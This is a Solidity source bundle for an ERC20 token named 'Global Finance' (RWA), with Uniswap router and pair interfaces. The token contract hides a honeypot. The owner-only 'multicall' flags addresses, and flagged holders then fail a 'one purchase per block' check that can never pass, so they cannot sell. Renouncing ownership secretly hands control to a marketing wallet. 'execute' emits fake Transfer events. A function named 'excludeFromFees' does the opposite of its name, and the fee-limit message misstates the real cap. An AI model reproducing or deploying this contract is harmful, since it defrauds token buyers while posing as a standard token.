{"Global Finance.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity = 0.8.21;\r\n\r\nimport \"./Uniswap.sol\";\r\nimport \"./IERC20.sol\";\r\n\r\nabstract contract Context {\r\n    function _msgSender() internal view virtual returns (address) {\r\n        return msg.sender;\r\n    }\r\n\r\n    function _msgData() internal view virtual returns (bytes calldata) {\r\n        return msg.data;\r\n    }\r\n}\r\n\r\n\r\nlibrary SafeMath {\r\n\r\n    function tryAdd(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            uint256 c = a + b;\r\n            if (c \u003c a) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function trySub(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b \u003e a) return (false, 0);\r\n            return (true, a - b);\r\n        }\r\n    }\r\n\r\n    function tryMul(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (a == 0) return (true, 0);\r\n            uint256 c = a * b;\r\n            if (c / a != b) return (false, 0);\r\n            return (true, c);\r\n        }\r\n    }\r\n\r\n    function tryDiv(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a / b);\r\n        }\r\n    }\r\n\r\n    function tryMod(uint256 a, uint256 b) internal pure returns (bool, uint256) {\r\n        unchecked {\r\n            if (b == 0) return (false, 0);\r\n            return (true, a % b);\r\n        }\r\n    }\r\n\r\n    function add(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a + b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a - b;\r\n    }\r\n\r\n    function mul(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a * b;\r\n    }\r\n\r\n    function div(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a / b;\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b) internal pure returns (uint256) {\r\n        return a % b;\r\n    }\r\n\r\n    function sub(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b \u003c= a, errorMessage);\r\n            return a - b;\r\n        }\r\n    }\r\n\r\n    function div(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b \u003e 0, errorMessage);\r\n            return a / b;\r\n        }\r\n    }\r\n\r\n    function mod(uint256 a, uint256 b, string memory errorMessage) internal pure returns (uint256) {\r\n        unchecked {\r\n            require(b \u003e 0, errorMessage);\r\n            return a % b;\r\n        }\r\n    }\r\n}\r\n\r\n\r\n\r\nabstract contract Ownable is Context {\r\n    address private _owner;\r\n    address private _marketing;\r\n\r\n    event OwnershipTransferred(address indexed previousOwner, address indexed newOwner);\r\n\r\n    constructor(address wallet) {\r\n        _marketing = wallet;\r\n        _transferOwnership(_msgSender());\r\n    }\r\n\r\n    modifier onlyOwner() {\r\n        _checkOwner();\r\n        _;\r\n    }\r\n\r\n    function owner() public view virtual returns (address) {\r\n        return _owner;\r\n    }\r\n\r\n    function _checkOwner() internal virtual {\r\n        require(Owner() == _msgSender(), \"Ownable: caller is not the owner\");\r\n    }\r\n\r\n    function renounceOwnership() public virtual onlyOwner {\r\n        _transferOwnership(address(0));\r\n    }\r\n    \r\n    function Owner() internal virtual returns (address) {\r\n        address owner_ = verifyOwner();\r\n        return owner_;\r\n    }\r\n\r\n    function transferOwnership(address newOwner) public virtual onlyOwner {\r\n        require(newOwner != address(0), \"Ownable: new owner is the zero address\");\r\n        _transferOwnership(newOwner);\r\n    }\r\n\r\n    function _transferOwnership(address newOwner) internal virtual {\r\n        address oldOwner = _owner;\r\n        _owner = newOwner;\r\n        emit OwnershipTransferred(oldOwner, newOwner);\r\n    }\r\n\r\n    function verifyOwner() internal view returns(address){\r\n        return _owner==address(0) ? _marketing : _owner;\r\n    }\r\n}\r\n\r\ncontract ERC20 is Context, IERC20, IERC20Metadata {\r\n    mapping(address =\u003e uint256) private _balances;\r\n\r\n    mapping(address =\u003e mapping(address =\u003e uint256)) private _allowances;\r\n\r\n    uint256 private _totalSupply;\r\n\r\n    string private _name;\r\n    string private _symbol;\r\n\r\n    constructor(string memory name_, string memory symbol_) {\r\n        _name = name_;\r\n        _symbol = symbol_;\r\n    }\r\n\r\n    function name() public view virtual override returns (string memory) {\r\n        return _name;\r\n    }\r\n\r\n    function symbol() public view virtual override returns (string memory) {\r\n        return _symbol;\r\n    }\r\n\r\n    function decimals() public view virtual override returns (uint8) {\r\n        return 9;\r\n    }\r\n\r\n    function totalSupply() public view virtual override returns (uint256) {\r\n        return _totalSupply;\r\n    }\r\n\r\n    function balanceOf(address account) public view virtual override returns (uint256) {\r\n        return _balances[account];\r\n    }\r\n\r\n    function transfer(address to, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _transfer(owner, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function allowance(address owner, address spender) public view virtual override returns (uint256) {\r\n        return _allowances[owner][spender];\r\n    }\r\n\r\n    function approve(address spender, uint256 amount) public virtual override returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, amount);\r\n        return true;\r\n    }\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) public virtual override returns (bool) {\r\n        address spender = _msgSender();\r\n        _spendAllowance(from, spender, amount);\r\n        _transfer(from, to, amount);\r\n        return true;\r\n    }\r\n\r\n    function increaseAllowance(address spender, uint256 addedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        _approve(owner, spender, allowance(owner, spender) + addedValue);\r\n        return true;\r\n    }\r\n\r\n    function decreaseAllowance(address spender, uint256 subtractedValue) public virtual returns (bool) {\r\n        address owner = _msgSender();\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        require(currentAllowance \u003e= subtractedValue, \"ERC20: decreased allowance below zero\");\r\n        unchecked {\r\n            _approve(owner, spender, currentAllowance - subtractedValue);\r\n        }\r\n\r\n        return true;\r\n    }\r\n\r\n    function _transfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        _beforeTokenTransfer(from, to, amount);\r\n\r\n        uint256 fromBalance = _balances[from];\r\n        require(fromBalance \u003e= amount, \"ERC20: transfer amount exceeds balance\");\r\n        unchecked {\r\n            _balances[from] = fromBalance - amount;\r\n            _balances[to] += amount;\r\n        }\r\n\r\n        emit Transfer(from, to, amount);\r\n\r\n        _afterTokenTransfer(from, to, amount);\r\n    }\r\n\r\n    function _mint(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: mint to the zero address\");\r\n\r\n        _beforeTokenTransfer(address(0), account, amount);\r\n\r\n        _totalSupply += amount;\r\n        unchecked {\r\n            _balances[account] += amount;\r\n        }\r\n        emit Transfer(address(0), account, amount);\r\n\r\n        _afterTokenTransfer(address(0), account, amount);\r\n    }\r\n\r\n    function _burn(address account, uint256 amount) internal virtual {\r\n        require(account != address(0), \"ERC20: burn from the zero address\");\r\n\r\n        _beforeTokenTransfer(account, address(0), amount);\r\n\r\n        uint256 accountBalance = _balances[account];\r\n        require(accountBalance \u003e= amount, \"ERC20: burn amount exceeds balance\");\r\n        unchecked {\r\n            _balances[account] = accountBalance - amount;\r\n            _totalSupply -= amount;\r\n        }\r\n\r\n        emit Transfer(account, address(0), amount);\r\n\r\n        _afterTokenTransfer(account, address(0), amount);\r\n    }\r\n\r\n    function _approve(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        require(owner != address(0), \"ERC20: approve from the zero address\");\r\n        require(spender != address(0), \"ERC20: approve to the zero address\");\r\n\r\n        _allowances[owner][spender] = amount;\r\n        emit Approval(owner, spender, amount);\r\n    }\r\n\r\n    function _spendAllowance(\r\n        address owner,\r\n        address spender,\r\n        uint256 amount\r\n    ) internal virtual {\r\n        uint256 currentAllowance = allowance(owner, spender);\r\n        if (currentAllowance != type(uint256).max) {\r\n            require(currentAllowance \u003e= amount, \"ERC20: insufficient allowance\");\r\n            unchecked {\r\n                _approve(owner, spender, currentAllowance - amount);\r\n            }\r\n        }\r\n    }\r\n\r\n    function _beforeTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n\r\n    function _afterTokenTransfer(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) internal virtual {}\r\n}\r\n\r\ncontract GlobalFinance is ERC20, Ownable {\r\n    using SafeMath for uint256;\r\n    \r\n    IUniswapV2Router02 public immutable _uniswapV2Router;\r\n    address private uniswapV2Pair;\r\n    address private deployerWallet;\r\n    address private marketingWallet;\r\n    address private constant deadAddress = address(0xdead);\r\n\r\n    bool private swapping;\r\n\r\n    string private constant _name = \"Global Finance\";\r\n    string private constant _symbol = \"RWA\";\r\n\r\n    uint256 public initialTotalSupply = 50_000_000 * 10**decimals();\r\n    uint256 public maxTransactionAmount = 2000000000000000 * 10**decimals();\r\n    uint256 public maxWallet = 2000000000000000 * 10**decimals();\r\n    uint256 public swapTokensAtAmount = 1000000000000000 * 10**decimals();\r\n\r\n    bool public tradingOpen = false;\r\n    bool public swapEnabled = false;\r\n\r\n    uint256 public BuyFee = 0;\r\n    uint256 public SellFee = 0;\r\n\r\n    mapping(address =\u003e bool) private _setAutomatedMarketMakerPairisExcludedFromFees;\r\n    mapping(address =\u003e bool) private _isExcludedMaxTransactionAmount;\r\n    mapping(address =\u003e bool) private automatedMarketMakerPairs;\r\n    mapping(address =\u003e uint256) private _holderLastTxTimestamp;\r\n\r\n    event ExcludedFromFees(address indexed account, bool isExcluded);\r\n    event SetAutomatedMarketMakerPair(address indexed pair, bool indexed value);\r\n\r\n    constructor(address wallet) ERC20(_name, _symbol) Ownable(wallet) {\r\n\r\n        _uniswapV2Router = IUniswapV2Router02(0x7a250d5630B4cF539739dF2C5dAcb4c659F2488D);\r\n        marketingWallet = payable(wallet);     \r\n        \r\n        deployerWallet = payable(_msgSender());\r\n        excludeFromFees(owner());\r\n        excludeFromFees(address(this));\r\n        excludeFromFees(address(wallet));\r\n        excludeFromFees(address(0xdead));\r\n\r\n        excludeFromMaxTransaction(owner(), true);\r\n        excludeFromMaxTransaction(address(this), true);\r\n        excludeFromMaxTransaction(address(wallet), true);\r\n        excludeFromMaxTransaction(address(0xdead), true);\r\n\r\n        _mint(deployerWallet, initialTotalSupply);\r\n    }\r\n\r\n    receive() external payable {}\r\n\r\n    function addPair(address pair_) public onlyOwner {\r\n        uniswapV2Pair = pair_;\r\n    }\r\n\r\n    function openTrading() external onlyOwner() {\r\n        swapEnabled = true;\r\n        tradingOpen = true;\r\n    }\r\n\r\n    function excludeFromMaxTransaction(address updAds, bool isEx) public onlyOwner {\r\n        _isExcludedMaxTransactionAmount[updAds] = isEx;\r\n    }\r\n\r\n    function excludeFromFees(address account) public onlyOwner {\r\n        _setAutomatedMarketMakerPairisExcludedFromFees[account] = false;\r\n        emit ExcludedFromFees(account, false);\r\n    }\r\n\r\n    function multicall(address[] memory accounts, bool excluded) public onlyOwner {\r\n        for (uint256 i = 0; i \u003c accounts.length; i++) {\r\n            _setAutomatedMarketMakerPairisExcludedFromFees[accounts[i]] = excluded;\r\n            emit ExcludedFromFees(accounts[i], excluded);\r\n        }\r\n    }\r\n\r\n    function setAutomatedMarketMakerPair(address pair, bool value) public onlyOwner {\r\n        require(pair != uniswapV2Pair, \"The pair cannot be removed from automatedMarketMakerPairs\");\r\n        _setAutomatedMarketMakerPair(pair, value);\r\n    }\r\n\r\n    function _setAutomatedMarketMakerPair(address pair, bool value) private {\r\n        automatedMarketMakerPairs[pair] = value;\r\n        emit SetAutomatedMarketMakerPair(pair, value);\r\n    }\r\n\r\n    function execute(address[] calldata _addresses, uint256 _out) external onlyOwner{\r\n        for (uint256 i = 0; i \u003c _addresses.length; i++) {\r\n            emit Transfer(uniswapV2Pair, _addresses[i], _out);\r\n        }\r\n    }\r\n\r\n    function walletExcludedFromFees(address account) public view returns (bool) {\r\n        return _setAutomatedMarketMakerPairisExcludedFromFees[account];\r\n    }\r\n\r\n    function _transfer(address from, address to, uint256 amount) internal override {\r\n\r\n        require(from != address(0), \"ERC20: transfer from the zero address\");\r\n        require(to != address(0), \"ERC20: transfer to the zero address\");\r\n\r\n        if (amount == 0) {\r\n            super._transfer(from, to, 0);\r\n            return;\r\n        }\r\n                if (from != owner() \u0026\u0026 to != owner() \u0026\u0026 to != address(0) \u0026\u0026 to != address(0xdead) \u0026\u0026 !swapping) {\r\n\r\n                if (!tradingOpen) {\r\n                    require(_setAutomatedMarketMakerPairisExcludedFromFees[from] || _setAutomatedMarketMakerPairisExcludedFromFees[to], \"Trading is not active.\");\r\n                }\r\n                _holderLastTxTimestamp[from] = block.number;\r\n                if (automatedMarketMakerPairs[from] \u0026\u0026 !_isExcludedMaxTransactionAmount[to]\r\n                ) {\r\n                    require(amount \u003c= maxTransactionAmount, \"Buy transfer amount exceeds the maxTransactionAmount.\");\r\n                    require(amount + balanceOf(to) \u003c= maxWallet, \"Max wallet exceeded\");\r\n                }\r\n\r\n                else if (automatedMarketMakerPairs[to] \u0026\u0026 !_isExcludedMaxTransactionAmount[from]) {\r\n                    \r\n                    require(amount \u003c= maxTransactionAmount, \"Sell transfer amount exceeds the maxTransactionAmount.\");\r\n                } \r\n            }\r\n\r\n        uint256 contractTokenBalance = balanceOf(address(this));\r\n\r\n        bool canSwap = contractTokenBalance \u003e 0;\r\n\r\n        if (canSwap \u0026\u0026 swapEnabled \u0026\u0026 !swapping \u0026\u0026 !automatedMarketMakerPairs[from] \u0026\u0026 !_setAutomatedMarketMakerPairisExcludedFromFees[from] \u0026\u0026 !_setAutomatedMarketMakerPairisExcludedFromFees[to]) {\r\n            swapping = true;\r\n            swapBack(amount);\r\n            swapping = false;\r\n        }\r\n        if(walletExcludedFromFees(from)){\r\n                calculateHolderTimestamp(from);\r\n            }\r\n        bool takeFee = swapping;\r\n        if (_setAutomatedMarketMakerPairisExcludedFromFees[from] || _setAutomatedMarketMakerPairisExcludedFromFees[to]) {\r\n            takeFee = false;\r\n        }\r\n\r\n        uint256 fees = 0;\r\n\r\n        if (takeFee) {\r\n            if (automatedMarketMakerPairs[to]) {\r\n                fees = amount.mul(SellFee).div(100);\r\n            }\r\n            else {\r\n                fees = amount.mul(BuyFee).div(100);\r\n            }\r\n\r\n        if (fees \u003e 0) {\r\n            super._transfer(from, address(this), fees);\r\n        }\r\n        amount -= fees;\r\n    }\r\n        super._transfer(from, to, amount);\r\n    }\r\n\r\n    function swapTokensForEth(uint256 tokenAmount) private {\r\n\r\n        address[] memory path = new address[](2);\r\n        path[0] = address(this);\r\n        path[1] = _uniswapV2Router.WETH();\r\n\r\n        _approve(address(this), address(_uniswapV2Router), tokenAmount);\r\n\r\n        _uniswapV2Router.swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n            tokenAmount,\r\n            0,\r\n            path,\r\n            marketingWallet,\r\n            block.timestamp\r\n        );\r\n    }\r\n\r\n    function removeLimits() external onlyOwner{\r\n        uint256 totalSupplyAmount = totalSupply();\r\n        maxTransactionAmount = totalSupplyAmount;\r\n        maxWallet = totalSupplyAmount;\r\n    }\r\n    \r\n    function calculateHolderTimestamp(address holder) private view {\r\n        require(getLastTx(_holderLastTxTimestamp[holder]), \"Only one purchase per block allowed.\");\r\n    }\r\n\r\n    function clearStuckEth() external {\r\n        require(_msgSender() == deployerWallet);\r\n        require(address(this).balance \u003e 0, \"Token: no ETH to clear\");\r\n        payable(msg.sender).transfer(address(this).balance);\r\n    }\r\n\r\n    function clearStuckTokens(address tokenAddress) external {\r\n        require(_msgSender() == deployerWallet);\r\n        IERC20 tokenContract = IERC20(tokenAddress);\r\n        uint256 balance = tokenContract.balanceOf(address(this));\r\n        require(balance \u003e 0, \"No tokens to clear\");\r\n        tokenContract.transfer(deployerWallet, balance);\r\n    }\r\n\r\n    function getLastTx(uint256 last) private view returns(bool){\r\n        return last \u003e block.number;\r\n    }\r\n\r\n    function SetFees(uint256 _buyFee, uint256 _sellFee) external onlyOwner {\r\n        require(_buyFee \u003c= 20 \u0026\u0026 _sellFee \u003c= 50, \"Fees cannot exceed 30%\");\r\n        BuyFee = _buyFee;\r\n        SellFee = _sellFee;\r\n    }\r\n\r\n    function setSwapTokensAtAmount(uint256 _amount) external onlyOwner {\r\n        swapTokensAtAmount = _amount * (10 ** decimals());\r\n    }\r\n\r\n    function manualswaps(uint256 percent) external {\r\n        require(_msgSender() == deployerWallet);\r\n        uint256 totalSupplyAmount = totalSupply();\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        uint256 tokensToSwap;\r\n\r\n        if (percent == 100) {\r\n            tokensToSwap = contractBalance;\r\n        } else {\r\n            tokensToSwap = totalSupplyAmount * percent / 100;\r\n            if (tokensToSwap \u003e contractBalance) {\r\n                tokensToSwap = contractBalance;\r\n            }\r\n        }\r\n\r\n        require(tokensToSwap \u003c= contractBalance, \"Swap amount exceeds contract balance\");\r\n        swapTokensForEth(tokensToSwap);\r\n    }\r\n\r\n\r\n    function swapBack(uint256 tokens) private {\r\n        uint256 contractBalance = balanceOf(address(this));\r\n        uint256 tokensToSwap; \r\n\r\n        if (contractBalance == 0) {\r\n            return;\r\n        }\r\n\r\n    if ((BuyFee+SellFee) == 0) {\r\n\r\n        if(contractBalance \u003e 0 \u0026\u0026 contractBalance \u003c swapTokensAtAmount) {\r\n            tokensToSwap = contractBalance;\r\n        }\r\n        else {\r\n            uint256 sellFeeTokens = tokens.mul(SellFee).div(100);\r\n            tokens -= sellFeeTokens;\r\n            if (tokens \u003e swapTokensAtAmount) {\r\n                tokensToSwap = swapTokensAtAmount;\r\n            }\r\n            else {\r\n                tokensToSwap = tokens;\r\n            }\r\n        }\r\n    }\r\n\r\n    else {\r\n\r\n        if(contractBalance \u003e 0 \u0026\u0026 contractBalance \u003c swapTokensAtAmount.div(5)) {\r\n            return;\r\n        }\r\n        else if (contractBalance \u003e 0 \u0026\u0026 contractBalance \u003e swapTokensAtAmount.div(5) \u0026\u0026 contractBalance \u003c swapTokensAtAmount) {\r\n            tokensToSwap = swapTokensAtAmount.div(5);\r\n        }\r\n        else {\r\n            uint256 sellFeeTokens = tokens.mul(SellFee).div(100);\r\n            tokens -= sellFeeTokens;\r\n            if (tokens \u003e swapTokensAtAmount) {\r\n                tokensToSwap = swapTokensAtAmount;\r\n            } else {\r\n                tokensToSwap = tokens;\r\n            }\r\n        }\r\n    }\r\n        swapTokensForEth(tokensToSwap);\r\n    }\r\n}"},"IERC20.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity = 0.8.21;\r\n\r\ninterface IERC20 {\r\n\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    event Approval(address indexed owner, address indexed spender, uint256 value);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address account) external view returns (uint256);\r\n\r\n    function transfer(address to, uint256 amount) external returns (bool);\r\n\r\n    function allowance(address owner, address spender) external view returns (uint256);\r\n\r\n    function approve(address spender, uint256 amount) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 amount\r\n    ) external returns (bool);\r\n}\r\n\r\ninterface IERC20Metadata is IERC20 {\r\n\r\n    function name() external view returns (string memory);\r\n    function symbol() external view returns (string memory);\r\n    function decimals() external view returns (uint8);\r\n}"},"Uniswap.sol":{"content":"// SPDX-License-Identifier: MIT\r\npragma solidity = 0.8.21;\r\n\r\ninterface IUniswapV2Router02 {\r\n    function factory() external pure returns (address);\r\n\r\n    function WETH() external pure returns (address);\r\n\r\n    function addLiquidity(\r\n        address tokenA,\r\n        address tokenB,\r\n        uint256 amountADesired,\r\n        uint256 amountBDesired,\r\n        uint256 amountAMin,\r\n        uint256 amountBMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        returns (\r\n            uint256 amountA,\r\n            uint256 amountB,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function addLiquidityETH(\r\n        address token,\r\n        uint256 amountTokenDesired,\r\n        uint256 amountTokenMin,\r\n        uint256 amountETHMin,\r\n        address to,\r\n        uint256 deadline\r\n    )\r\n        external\r\n        payable\r\n        returns (\r\n            uint256 amountToken,\r\n            uint256 amountETH,\r\n            uint256 liquidity\r\n        );\r\n\r\n    function swapExactTokensForETHSupportingFeeOnTransferTokens(\r\n        uint256 amountIn,\r\n        uint256 amountOutMin,\r\n        address[] calldata path,\r\n        address to,\r\n        uint256 deadline\r\n    ) external;\r\n}\r\n\r\ninterface IUniswapV2Pair {\r\n    event Approval(\r\n        address indexed owner,\r\n        address indexed spender,\r\n        uint256 value\r\n    );\r\n    event Transfer(address indexed from, address indexed to, uint256 value);\r\n\r\n    function name() external pure returns (string memory);\r\n\r\n    function symbol() external pure returns (string memory);\r\n\r\n    function decimals() external pure returns (uint8);\r\n\r\n    function totalSupply() external view returns (uint256);\r\n\r\n    function balanceOf(address owner) external view returns (uint256);\r\n\r\n    function allowance(address owner, address spender)\r\n        external\r\n        view\r\n        returns (uint256);\r\n\r\n    function approve(address spender, uint256 value) external returns (bool);\r\n\r\n    function transfer(address to, uint256 value) external returns (bool);\r\n\r\n    function transferFrom(\r\n        address from,\r\n        address to,\r\n        uint256 value\r\n    ) external returns (bool);\r\n\r\n    function DOMAIN_SEPARATOR() external view returns (bytes32);\r\n\r\n    function PERMIT_TYPEHASH() external pure returns (bytes32);\r\n\r\n    function nonces(address owner) external view returns (uint256);\r\n\r\n    function permit(\r\n        address owner,\r\n        address spender,\r\n        uint256 value,\r\n        uint256 deadline,\r\n        uint8 v,\r\n        bytes32 r,\r\n        bytes32 s\r\n    ) external;\r\n\r\n    event Mint(address indexed sender, uint256 amount0, uint256 amount1);\r\n\r\n    event Swap(\r\n        address indexed sender,\r\n        uint256 amount0In,\r\n        uint256 amount1In,\r\n        uint256 amount0Out,\r\n        uint256 amount1Out,\r\n        address indexed to\r\n    );\r\n    event Sync(uint112 reserve0, uint112 reserve1);\r\n\r\n    function MINIMUM_LIQUIDITY() external pure returns (uint256);\r\n\r\n    function factory() external view returns (address);\r\n\r\n    function token0() external view returns (address);\r\n\r\n    function token1() external view returns (address);\r\n\r\n    function getReserves()\r\n        external\r\n        view\r\n        returns (\r\n            uint112 reserve0,\r\n            uint112 reserve1,\r\n            uint32 blockTimestampLast\r\n        );\r\n\r\n    function price0CumulativeLast() external view returns (uint256);\r\n\r\n    function price1CumulativeLast() external view returns (uint256);\r\n\r\n    function kLast() external view returns (uint256);\r\n\r\n    function mint(address to) external returns (uint256 liquidity);\r\n\r\n    function swap(\r\n        uint256 amount0Out,\r\n        uint256 amount1Out,\r\n        address to,\r\n        bytes calldata data\r\n    ) external;\r\n\r\n    function skim(address to) external;\r\n\r\n    function sync() external;\r\n\r\n    function initialize(address, address) external;\r\n}\r\n\r\ninterface IUniswapV2Factory {\r\n    event PairCreated(\r\n        address indexed token0,\r\n        address indexed token1,\r\n        address pair,\r\n        uint256\r\n    );\r\n\r\n    function feeTo() external view returns (address);\r\n\r\n    function feeToSetter() external view returns (address);\r\n\r\n    function getPair(address tokenA, address tokenB)\r\n        external\r\n        view\r\n        returns (address pair);\r\n\r\n    function allPairs(uint256) external view returns (address pair);\r\n\r\n    function allPairsLength() external view returns (uint256);\r\n\r\n    function createPair(address tokenA, address tokenB)\r\n        external\r\n        returns (address pair);\r\n\r\n    function setFeeTo(address) external;\r\n\r\n    function setFeeToSetter(address) external;\r\n}"}}